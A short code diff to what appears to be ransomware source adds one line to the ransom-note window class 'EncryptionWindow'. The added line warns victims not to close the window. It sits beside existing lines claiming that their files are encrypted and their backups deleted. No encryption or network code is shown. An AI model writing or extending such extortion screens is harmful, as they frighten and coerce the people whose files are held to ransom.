@@ -28,6 +28,8 @@ class EncryptionWindow:
         self.loadWarningLabel("""
             All your files have been encrypted with military-grade encryption. """)
 
+        self.loadWarningLabel("Do not close this window or stand the chance to loose all your files... ")
+
         self.loadWarningLabel("Backups were either encrypted or deleted or backup disk were formatted. ")
 
         # Displaying more warning messages
